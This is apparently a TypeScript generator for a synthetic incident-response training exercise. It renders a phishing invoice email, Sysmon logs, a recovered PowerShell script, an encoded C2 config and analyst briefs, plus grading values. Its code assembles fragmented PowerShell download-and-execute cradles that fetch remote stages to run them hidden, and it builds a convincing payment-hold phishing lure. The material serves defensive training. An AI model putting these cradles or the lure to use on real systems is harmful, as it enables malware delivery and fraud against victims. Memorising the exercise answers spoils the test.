import { Rng } from './lib/prng';
import { bytesToBase64, escapeXml, hexdump, utf16leBytes, utf8Bytes, xorBytes } from './lib/encode';
import { obfuscateIp } from './lib/ip';
import type { Artifact } from './types';
import { ADDR, guid, ORG, rfc5322, sysmonUtc, sysTime, type World } from './world';

// Renders every artifact in the evidence bundle from the scenario model.
// Strings that look like live tradecraft are assembled from fragments so the
// repository itself never contains a ready-to-run cradle.

const J = (...parts: string[]) => parts.join('');
const PS_EXE = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
const SYSMON_GUID = '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}';

export interface Evidence {
  artifacts: Artifact[];
  paths: {
    eml: string;
    zone: string;
    sysmonXml: string;
    sysmonJsonl: string;
    script: string;
    config: string;
    caseBrief: string;
    containmentBrief: string;
    collectionBrief: string;
  };
  /** Values derived while rendering that the modules need for grading. */
  derived: {
    encodedFlag: string;
    encodedB64: string;
    stage1Plain: string;
    obfuscatedHost: string;
    configPlain: string;
    payloadPath: string;
    encodedPid: number;
  };
}

interface SysmonEvent {
  id: number;
  time: Date;
  data: [string, string][];
}

function userPaths(w: World) {
  const home = `C:\\Users\\${w.victim.username}`;
  return {
    home,
    downloads: `${home}\\Downloads`,
    temp: `${home}\\AppData\\Local\\Temp`,
  };
}

// ---------- Email ----------

function renderEml(w: World, rng: Rng): string {
  const a = w.attacker;
  const boundary = `b1_${rng.hex(10)}`;
  const queueId = rng.alnum(12).toUpperCase();
  const bounceId = rng.hex(6);
  const sent = ADDR.addSeconds(w.t.emailReceived, -rng.int(2, 9));
  const internalHop = ADDR.addSeconds(w.t.emailReceived, 1);
  const displayLink = `https://${ORG.domain}/ap/invoices/${w.ids.invoiceNo}`;
  const amount = `${rng.int(4, 48)},${String(rng.int(0, 999)).padStart(3, '0')}.${String(rng.int(0, 99)).padStart(2, '0')}`;
  const lines = [
    `Return-Path: <bounce+${bounceId}@${a.mailDomain}>`,
    `Received: from ${ORG.mx} (${ORG.mx} [10.20.1.25])`,
    `\tby mbx02.${ORG.adDomain} with ESMTP id ${rng.alnum(10).toUpperCase()}`,
    `\tfor <${w.victim.email}>; ${rfc5322(internalHop)}`,
    `Received: from ${a.sendHost} (${a.sendHost} [${a.sendIp}])`,
    `\tby ${ORG.mx} with ESMTPS id ${queueId}`,
    `\tfor <${w.victim.email}>; ${rfc5322(w.t.emailReceived)}`,
    `Authentication-Results: ${ORG.mx};`,
    `\tspf=pass (${ORG.mx}: domain of bounce+${bounceId}@${a.mailDomain} designates ${a.sendIp} as permitted sender) smtp.mailfrom=${a.mailDomain};`,
    `\tdkim=none (message not signed);`,
    `\tdmarc=fail (p=NONE sp=NONE dis=NONE) header.from=${ORG.domain}`,
    `From: "Accounts Payable" <ap@${ORG.domain}>`,
    `Reply-To: "Accounts Payable" <ap@${a.replyToDomain}>`,
    `To: "${w.victim.display}" <${w.victim.email}>`,
    `Subject: Payment hold: invoice ${w.ids.invoiceNo} needs your review`,
    `Date: ${rfc5322(sent)}`,
    `Message-ID: ${w.ids.messageId}`,
    `MIME-Version: 1.0`,
    `Content-Type: multipart/alternative; boundary="${boundary}"`,
    ``,
    `--${boundary}`,
    `Content-Type: text/plain; charset="utf-8"`,
    `Content-Transfer-Encoding: 7bit`,
    ``,
    `Hi ${w.victim.first},`,
    ``,
    `Invoice ${w.ids.invoiceNo} ($${amount}) is on payment hold because the`,
    `remittance details could not be matched. Please review the invoice today`,
    `so the vendor is not put on credit hold:`,
    ``,
    `${a.landingUrl}`,
    ``,
    `Thank you,`,
    `Accounts Payable`,
    `${ORG.name}`,
    ``,
    `--${boundary}`,
    `Content-Type: text/html; charset="utf-8"`,
    `Content-Transfer-Encoding: 7bit`,
    ``,
    `<html><body style="font-family:Arial,sans-serif;font-size:14px">`,
    `<p>Hi ${w.victim.first},</p>`,
    `<p>Invoice <b>${w.ids.invoiceNo}</b> ($${amount}) is on payment hold because the remittance details could not be matched.`,
    `Please review the invoice today so the vendor is not put on credit hold:</p>`,
    `<p><a href="${a.landingUrl}">${displayLink}</a></p>`,
    `<p>Thank you,<br>Accounts Payable<br>${ORG.name}</p>`,
    `</body></html>`,
    ``,
    `--${boundary}--`,
    ``,
  ];
  return lines.join('\r\n');
}

// ---------- Mark of the Web ----------

function renderZone(w: World): string {
  return ['[ZoneTransfer]', 'ZoneId=3', `ReferrerUrl=${w.attacker.landingUrl}`, `HostUrl=${w.attacker.fileUrl}`, ''].join('\r\n');
}

// ---------- PowerShell stages ----------

function stage1Command(w: World): string {
  const wc = J('(New-Object ', 'Net.Web', 'Client)');
  const dl = J('.Down', 'loadFile');
  return (
    `$ProgressPreference='SilentlyContinue';` +
    `$d=Join-Path $env:TEMP '${w.ids.stage1Name}.ps1';` +
    `${wc}${dl}('${w.attacker.stage1Url}',$d);` +
    `& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $d`
  );
}

function renderScript(w: World, rng: Rng, obfHost: string): string {
  const v = () => `$${rng.pick(['k', 'q', 'z', 'x', 'm', 'r', 'v'])}${rng.alnum(rng.int(2, 4))}`;
  const hostVar = v();
  const pathVar = v();
  const junk = [
    `${v()} = '${rng.alnum(3)}' + '${rng.alnum(4)}'`,
    `${v()} = 0x${rng.hex(2)} -bxor 0x${rng.hex(1)}`,
    `${v()} = @(${rng.int(2, 9)},${rng.int(10, 40)},${rng.int(41, 90)}) | ForEach-Object { $_ * ${rng.int(2, 7)} }`,
    `${v()} = [Environment]::TickCount % ${rng.int(5, 13)}`,
    `${v()} = '${rng.alnum(6)}'.ToUpper().Length`,
    `${v()} = Get-Date -Format 'yyyyMMdd'`,
  ];
  const irm = J('ir', 'm');
  const iex = J('ie', 'x');
  const lines = rng.shuffle(junk).slice(0, 4);
  const core = [
    `${hostVar} = '${obfHost}'`,
    `${pathVar} = '/${w.attacker.stage2Path}'`,
  ];
  const cradle = `${irm} ('ht' + 'tp://' + ${hostVar} + ${pathVar}) -UseBasicParsing | ${iex}`;
  const out = [lines[0], core[0], lines[1], lines[2], core[1], lines[3], cradle];
  return out.join('\r\n') + '\r\n';
}

function configJson(w: World, rng: Rng): string {
  return JSON.stringify({
    ver: `2.${rng.int(1, 9)}.${rng.int(0, 20)}`,
    c2: w.attacker.c2Url,
    sleep: rng.pick([30, 45, 60, 90, 120]),
    jitter: rng.pick([10, 15, 20, 25]),
    id: w.ids.botId,
    kill: '2026-12-31',
  });
}

// ---------- Sysmon ----------

function sysmonXml(events: SysmonEvent[], w: World, rng: Rng, firstRecord: number): string {
  const out: string[] = ['<?xml version="1.0" encoding="utf-8"?>', '<Events>'];
  events.forEach((e, i) => {
    out.push('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">');
    out.push('  <System>');
    out.push(`    <Provider Name="Microsoft-Windows-Sysmon" Guid="${SYSMON_GUID}" />`);
    out.push(`    <EventID>${e.id}</EventID>`);
    out.push(`    <Version>${e.id === 1 ? 5 : e.id === 11 ? 2 : 3}</Version>`);
    out.push('    <Level>4</Level>');
    out.push(`    <Task>${e.id}</Task>`);
    out.push('    <Opcode>0</Opcode>');
    out.push('    <Keywords>0x8000000000000000</Keywords>');
    out.push(`    <TimeCreated SystemTime="${sysTime(e.time, rng)}" />`);
    out.push(`    <EventRecordID>${firstRecord + i}</EventRecordID>`);
    out.push('    <Correlation />');
    out.push(`    <Execution ProcessID="${rng.int(2000, 3999)}" ThreadID="${rng.int(4000, 9999)}" />`);
    out.push('    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>');
    out.push(`    <Computer>${w.host.fqdn}</Computer>`);
    out.push('    <Security UserID="S-1-5-18" />');
    out.push('  </System>');
    out.push('  <EventData>');
    for (const [k, val] of e.data) out.push(`    <Data Name="${k}">${escapeXml(val)}</Data>`);
    out.push('  </EventData>');
    out.push('</Event>');
  });
  out.push('</Events>', '');
  return out.join('\r\n');
}

function sysmonJsonl(events: SysmonEvent[], w: World, firstRecord: number): string {
  return (
    events
      .map((e, i) =>
        JSON.stringify({
          '@timestamp': e.time.toISOString(),
          event: { code: String(e.id), provider: 'Microsoft-Windows-Sysmon', kind: 'event' },
          host: { name: w.host.fqdn },
          winlog: {
            channel: 'Microsoft-Windows-Sysmon/Operational',
            provider_name: 'Microsoft-Windows-Sysmon',
            event_id: e.id,
            record_id: firstRecord + i,
            computer_name: w.host.fqdn,
            event_data: Object.fromEntries(e.data),
          },
        }),
      )
      .join('\n') + '\n'
  );
}

interface Proc {
  guid: string;
  pid: number;
  image: string;
  cmd: string;
  user: string;
  integrity: string;
  cwd: string;
  meta: { ver: string; desc: string; product: string; company: string; orig: string };
}

const WIN = {
  ver: '10.0.22621.1 (WinBuild.160101.0800)',
  product: 'Microsoft\u00ae Windows\u00ae Operating System',
  company: 'Microsoft Corporation',
};

function procCreate(time: Date, p: Proc, parent: Proc, logonGuid: string, logonId: string, rng: Rng): SysmonEvent {
  return {
    id: 1,
    time,
    data: [
      ['RuleName', '-'],
      ['UtcTime', sysmonUtc(time)],
      ['ProcessGuid', p.guid],
      ['ProcessId', String(p.pid)],
      ['Image', p.image],
      ['FileVersion', p.meta.ver],
      ['Description', p.meta.desc],
      ['Product', p.meta.product],
      ['Company', p.meta.company],
      ['OriginalFileName', p.meta.orig],
      ['CommandLine', p.cmd],
      ['CurrentDirectory', p.cwd],
      ['User', p.user],
      ['LogonGuid', logonGuid],
      ['LogonId', logonId],
      ['TerminalSessionId', p.user.startsWith('NT AUTHORITY') ? '0' : '1'],
      ['IntegrityLevel', p.integrity],
      ['Hashes', `SHA256=${rng.hex(32).toUpperCase()}`],
      ['ParentProcessGuid', parent.guid],
      ['ParentProcessId', String(parent.pid)],
      ['ParentImage', parent.image],
      ['ParentCommandLine', parent.cmd],
      ['ParentUser', parent.user],
    ],
  };
}

function fileCreate(time: Date, p: Proc, target: string): SysmonEvent {
  return {
    id: 11,
    time,
    data: [
      ['RuleName', '-'],
      ['UtcTime', sysmonUtc(time)],
      ['ProcessGuid', p.guid],
      ['ProcessId', String(p.pid)],
      ['Image', p.image],
      ['TargetFilename', target],
      ['CreationUtcTime', sysmonUtc(time)],
      ['User', p.user],
    ],
  };
}

// ---------- Briefs ----------

function caseBrief(w: World): string {
  return [
    `# Case brief`,
    ``,
    `**Alert:** "PowerShell launched with an encoded command by a file in a Downloads folder"`,
    `**Host:** ${w.host.name} (${w.host.ip}), ${w.host.os}`,
    `**Assigned to:** ${w.victim.display}, ${w.victim.title}, ${w.victim.dept}`,
    `**Alert time (UTC):** ${sysmonUtc(w.t.detected).slice(0, 19)}`,
    ``,
    `You're the analyst on shift. A triage collection from the host is attached:`,
    `the user's mailbox export, the Sysmon log, and files of interest. Work out what`,
    `happened, how it started, what infrastructure is involved, and what you'd do next.`,
    ``,
  ].join('\n');
}

export function containmentText(w: World): string {
  const common = `Your investigation shows ${w.host.name} is still beaconing to attacker infrastructure every minute or so. Nobody has touched the machine yet.`;
  switch (w.containment) {
    case 'edr-laptop':
      return [
        `# Containment scenario`,
        ``,
        `${w.host.name} is ${w.victim.display}'s Windows 11 laptop, on the office wired network today.`,
        `The ${ORG.name} EDR agent on it is **healthy and reporting**, and your role in the EDR console includes network containment.`,
        ``,
        common,
        ``,
        `The incident commander asks you to contain the host now while keeping the evidence you'll need.`,
        ``,
      ].join('\n');
    case 'no-edr-desktop':
      return [
        `# Containment scenario`,
        ``,
        `${w.host.name} is a shared Windows 11 desktop on floor 3, plugged into a wired switch port the network team can identify.`,
        `The EDR sensor on it **stopped reporting three days ago** and cannot be reached; no other remote tooling works on it.`,
        ``,
        common,
        ``,
        `The incident commander asks you to contain the host now while keeping the evidence you'll need.`,
        ``,
      ].join('\n');
    case 'server-no-edr':
      return [
        `# Containment scenario`,
        ``,
        `Lateral movement reached **FS-02**, a Windows file server that the warehouse shift depends on. It has no EDR agent`,
        `(an approved exception), and it sits behind an internal firewall the network team manages.`,
        ``,
        `FS-02 is now beaconing to the same infrastructure as ${w.host.name}. Nobody has touched the server yet.`,
        ``,
        `The incident commander asks you to contain FS-02 now while keeping the evidence you'll need.`,
        ``,
      ].join('\n');
  }
}

function collectionBrief(w: World): string {
  return [
    `# Collection scenario`,
    ``,
    `During the investigation you see interactive commands being typed on ${w.host.name} in real time:`,
    `directory listings, \`whoami /all\`, and attempts to reach a file server. This looks like a`,
    `hands-on-keyboard intruder, not just automated malware.`,
    ``,
    `You have remote access to the host and time to collect a few things before containment.`,
    `Pick the **first three** things to collect, in order.`,
    ``,
  ].join('\n');
}

// ---------- Assembly ----------

export function buildEvidence(w: World): Evidence {
  const rng = new Rng(`evidence:${w.seed}`);
  const p = userPaths(w);
  const H = w.host.name;
  const userDom = `${ORG.netbios}\\${w.victim.username}`;
  const logonGuid = guid(rng);
  const logonId = `0x${rng.hex(3)}`;

  const meta = (desc: string, orig: string) => ({ ver: WIN.ver, desc, product: WIN.product, company: WIN.company, orig });
  const mk = (image: string, cmd: string, user: string, integrity: string, cwd: string, m: Proc['meta']): Proc => ({
    guid: guid(rng),
    pid: rng.int(1000, 15999),
    image,
    cmd,
    user,
    integrity,
    cwd,
    meta: m,
  });

  const explorer = mk('C:\\Windows\\explorer.exe', 'C:\\Windows\\Explorer.EXE', userDom, 'Medium', 'C:\\Windows\\system32\\', meta('Windows Explorer', 'EXPLORER.EXE'));
  const payloadPath = `${p.downloads}\\invoice.pdf.exe`;
  const payload = mk(payloadPath, `"${payloadPath}" `, userDom, 'Medium', `${p.downloads}\\`, {
    ver: '3.11.2604.17',
    desc: 'PDF Document Viewer',
    product: 'Document Viewer',
    company: '-',
    orig: 'docview.exe',
  });

  const flag = rng.pick(['-EncodedCommand', '-enc', '-e', '-ec', '-EncodedComm']);
  const stage1Plain = stage1Command(w);
  const b64 = bytesToBase64(utf16leBytes(stage1Plain));
  const psMeta = meta('Windows PowerShell', 'PowerShell.EXE');
  const psEnc = mk(PS_EXE, `"${PS_EXE}" -NoP -W Hidden ${flag} ${b64}`, userDom, 'Medium', `${p.downloads}\\`, psMeta);
  const scriptPath = `${p.temp}\\${w.ids.stage1Name}.ps1`;
  const psFile = mk(PS_EXE, `"${PS_EXE}" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ${scriptPath}`, userDom, 'Medium', `${p.downloads}\\`, psMeta);
  const configPath = `C:\\ProgramData\\${w.ids.configDir}\\settings.dat`;

  // Benign background activity, including a legitimate PowerShell run by IT, so "powershell.exe" alone is not the answer.
  const services = mk('C:\\Windows\\System32\\services.exe', 'C:\\Windows\\system32\\services.exe', 'NT AUTHORITY\\SYSTEM', 'System', 'C:\\Windows\\system32\\', meta('Services and Controller app', 'services.exe'));
  const svchost = mk('C:\\Windows\\System32\\svchost.exe', 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule', 'NT AUTHORITY\\SYSTEM', 'System', 'C:\\Windows\\system32\\', meta('Host Process for Windows Services', 'svchost.exe'));
  const itPs = mk(PS_EXE, `"${PS_EXE}" -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\\ProgramData\\VelmoraIT\\inventory.ps1`, 'NT AUTHORITY\\SYSTEM', 'System', 'C:\\Windows\\system32\\', psMeta);
  const taskhost = mk('C:\\Windows\\System32\\taskhostw.exe', 'taskhostw.exe', userDom, 'Medium', 'C:\\Windows\\system32\\', meta('Host Process for Windows Tasks', 'taskhostw.exe'));
  const notepad = mk('C:\\Windows\\System32\\notepad.exe', `"C:\\Windows\\system32\\notepad.exe" ${p.home}\\Documents\\vendor-contacts.txt`, userDom, 'Medium', `${p.home}\\Documents\\`, meta('Notepad', 'NOTEPAD.EXE'));
  const conhost = mk('C:\\Windows\\System32\\conhost.exe', '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1', 'NT AUTHORITY\\SYSTEM', 'System', 'C:\\Windows\\system32\\', meta('Console Window Host', 'CONHOST.EXE'));

  // Real events carry sub-second timestamps; add milliseconds so UtcTime looks like a live log.
  const ms = (d: Date) => new Date(d.getTime() + rng.int(0, 999));
  const s = (base: Date, off: number) => ms(ADDR.addSeconds(base, off));
  const events: SysmonEvent[] = [
    procCreate(s(w.t.emailReceived, -rng.int(900, 1500)), itPs, svchost, guid(rng), '0x3e7', rng),
    procCreate(s(w.t.emailReceived, -rng.int(300, 800)), conhost, itPs, guid(rng), '0x3e7', rng),
    procCreate(s(w.t.clicked, -rng.int(60, 170)), notepad, explorer, logonGuid, logonId, rng),
    procCreate(s(w.t.clicked, rng.int(1, 6)), taskhost, services, logonGuid, logonId, rng),
    procCreate(ms(w.t.executed), payload, explorer, logonGuid, logonId, rng),
    procCreate(ms(w.t.stage1), psEnc, payload, logonGuid, logonId, rng),
    fileCreate(s(w.t.stage1, 1), psEnc, scriptPath),
    procCreate(s(w.t.stage1, 2), psFile, psEnc, logonGuid, logonId, rng),
    fileCreate(ms(w.t.configWritten), psFile, configPath),
    procCreate(s(w.t.configWritten, rng.int(30, 200)), mk('C:\\Windows\\System32\\svchost.exe', 'C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup', userDom, 'Medium', 'C:\\Windows\\system32\\', meta('Host Process for Windows Services', 'svchost.exe')), services, logonGuid, logonId, rng),
  ];
  events.sort((a, b) => a.time.getTime() - b.time.getTime());
  const firstRecord = rng.int(180000, 640000);

  const obfHost = obfuscateIp(w.attacker.stage2Ip, w.attacker.ipForm, new Rng(`ip:${w.seed}`));
  const script = renderScript(w, rng, obfHost);
  const cfgPlain = configJson(w, rng);
  const cfgBytes = xorBytes(utf8Bytes(cfgPlain), w.ids.xorKey);

  const paths = {
    eml: `${H}/email/${w.victim.username}/invoice-${w.ids.invoiceNo}.eml`,
    zone: `${H}/files/Users/${w.victim.username}/Downloads/invoice.pdf.exe_Zone.Identifier`,
    sysmonXml: `${H}/logs/Microsoft-Windows-Sysmon-Operational.xml`,
    sysmonJsonl: `${H}/logs/Microsoft-Windows-Sysmon-Operational.jsonl`,
    script: `${H}/files/Users/${w.victim.username}/AppData/Local/Temp/${w.ids.stage1Name}.ps1.txt`,
    config: `${H}/files/ProgramData/${w.ids.configDir}/settings.dat`,
    caseBrief: `briefs/case-brief.md`,
    containmentBrief: `briefs/containment-scenario.md`,
    collectionBrief: `briefs/collection-scenario.md`,
  };

  const artifacts: Artifact[] = [
    { path: paths.caseBrief, content: caseBrief(w), title: 'Case brief' },
    { path: paths.eml, content: renderEml(w, rng), title: 'Email from the user\'s mailbox (.eml, full headers)' },
    {
      path: paths.zone,
      content: renderZone(w),
      title: 'Zone.Identifier stream of invoice.pdf.exe',
      note: 'An NTFS alternate data stream. Collected as a separate file, because a colon cannot appear in a normal Windows filename.',
    },
    {
      path: paths.sysmonXml,
      content: sysmonXml(events, w, rng, firstRecord),
      title: 'Sysmon Operational log (XML)',
      note: 'Exported in wevtutil XML format (wevtutil qe Microsoft-Windows-Sysmon/Operational /f:xml /e:Events).',
    },
    {
      path: paths.sysmonJsonl,
      content: sysmonJsonl(events, w, firstRecord),
      title: 'Sysmon Operational log (JSON lines)',
      note: 'The same events as a log forwarder or SIEM would store them, one JSON object per line.',
    },
    {
      path: paths.script,
      content: script,
      title: `${w.ids.stage1Name}.ps1 recovered from the user's Temp folder`,
      note: 'Saved with an added .txt extension so it cannot be run by double-clicking.',
    },
    {
      path: paths.config,
      content: cfgBytes,
      view: hexdump(cfgBytes),
      title: 'settings.dat recovered from ProgramData',
      note: 'Binary file, shown as a hexdump. Download it to work on the raw bytes.',
    },
    { path: paths.containmentBrief, content: containmentText(w), title: 'Containment scenario' },
    { path: paths.collectionBrief, content: collectionBrief(w), title: 'Collection scenario' },
  ];

  return {
    artifacts,
    paths,
    derived: {
      encodedFlag: flag,
      encodedB64: b64,
      stage1Plain,
      obfuscatedHost: obfHost,
      configPlain: cfgPlain,
      payloadPath,
      encodedPid: psEnc.pid,
    },
  };
}

const cache = new Map<string, Evidence>();

export function evidenceFor(w: World): Evidence {
  let e = cache.get(w.seed);
  if (!e) {
    e = buildEvidence(w);
    cache.set(w.seed, e);
  }
  return e;
}
